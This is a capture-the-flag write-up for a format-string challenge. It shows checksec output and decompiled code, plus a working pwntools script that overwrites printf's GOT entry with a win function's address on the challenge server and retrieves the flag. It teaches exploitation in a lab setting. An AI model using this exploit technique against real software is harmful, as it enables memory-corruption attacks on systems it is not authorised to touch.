# Fanum Tax

Hello, they call me Theodore Rizzevelt and today you're gonna get mogged. The tiktok rizz party is out of control and only a true sigma can stop the skibid toilets. Surely a String bean like yourself can't find the flag. Get out of here before I send you back to Ohio.

nc 167.99.118.184 31337

## Challenge

Running checksec to see protections and file to see what we are working with:

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
```
└─$ file fanum_strings 
fanum_strings: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d11382f596ec7275f9cb21f0d2d245e73612b5fd, for GNU/Linux 3.2.0, not stripped
```

Nothing super special, based of file name we can make a guess that the challenge will have something to do with format strings, and we can see that being a possibility as we have partial relro here which would allow us to overwrite entries in the global offset table.

```
└─$ ./fanum_strings    
Welcome to the Tiktok Rizz Party!
Can you prove that you're a sigma by fanum taxxing all the skibidi toilets?
How many hours do you want to looksmaxx for? 1
Hour 1: %p
0x7fb3c6a66963
Now let's see if you mog...
```

Running the binary we can see that we indeed have a format string.

```c
void main(void)

{
  long in_FS_OFFSET;
  int local_34;
  int i;
  int local_2c;
  char local_28 [24];
  undefined8 local_10;
  
  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  puts("Welcome to the Tiktok Rizz Party!");
  puts("Can you prove that you\'re a sigma by fanum taxxing all the skibidi toilets?");
  printf("How many hours do you want to looksmaxx for? ");
  __isoc99_scanf("%d",&local_34);
  do {
    local_2c = getchar();
    if (local_2c == 10) break;
  } while (local_2c != -1);
  if ((local_34 < 1) || (0x18 < local_34)) {
    printf("You can\'t looksmaxx for that long!");
    FUN_00401140(0);
  }
  for (i = 0; i < local_34; i = i + 1) {
    printf("Hour %d: ",(ulong)(i + 1));
    fgets(local_28,24,stdin);
    printf(local_28);
  }
  puts("Now let\'s see if you mog...");
  FUN_00401140(0);
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}
```

In the decompiled code here from ghidra theres a few things to pick out. 
- We can execute up to 24 printf's or 24 hours 'looksmaxxing'
- We only get 24 characters to write to our variable being printed

We can also find a win function available inside the binary, so popping a shell wont be needed:
```c
void win(void)

{
  FILE *__stream;
  long in_FS_OFFSET;
  char local_58 [72];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  __stream = fopen("flag.txt","r");
  fgets(local_58,0x40,__stream);
  puts(local_58);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

Given partial relro, the attack here is trivial. We just need to overwrite the address of printf in the got to be the address of win. We can do this as printf will already be populated in the got since it was called before the format string vulnerability, and because of that partial relro.

Now normally I would use pwntools here to just create a format string payload and send it off but I didn't want to worry about it being longer than 24 bytes so I just did it manually.

The idea here is that we have access to stack addresses, with that we can place our input onto the stack and then print it out using the format string:
```
└─$ ./fanum_strings 
Welcome to the Tiktok Rizz Party!
Can you prove that you're a sigma by fanum taxxing all the skibidi toilets?
How many hours do you want to looksmaxx for? 1
Hour 1: AAAAAAAA%8$p
AAAAAAAA0x4141414141414141
Now let's see if you mog...
```
Given that, we can use the `%n` specifier to write to an address, we just need to insert our address into a reachable pointer. And given that we can display an arbitrary pointer we can just write the address that we want to write to. And after that we can reference that pointer using its offset with `%{offset}$n` to write to it. The way that `%n` works is that it writes however many bytes have already been written into that address. So we just need to write the address of win in bytes (Meaning if win is at 0x100, we write 0x100 bytes), and to do that we will use `%x` which is used to write bytes.

And heres how we will do that:

```python
from pwn import *

elf = context.binary = ELF('./fanum_strings')
#p = process('./fanum_strings')
p = remote('167.99.118.184', 31337)

#Address that we want to write to
printf = 0x404028

#Writing 0x401237 bytes (address of win function), then writing that number into offset 10
'''  
We are writing into offset 10 because at offset 8 we have 8 bytes of our format string,
then at offset 9 we have another 8 bytes (hence the A for the 8th byte padding), and
then at offset 10 we are placing the address that we would like to write to.
'''
payload = b'%4198967x%10$lnA' + p64(printf)
p.sendlineafter(b'for?', b'2')
p.sendline(payload)
p.interactive()
```

Running this script will exploit the format string vulnerability to overwrite the printf got entry with the address of win and then print the flag.

## Flag

`SIVBGR{5up3r_4w350m3_5k1b1d1_r1zz}`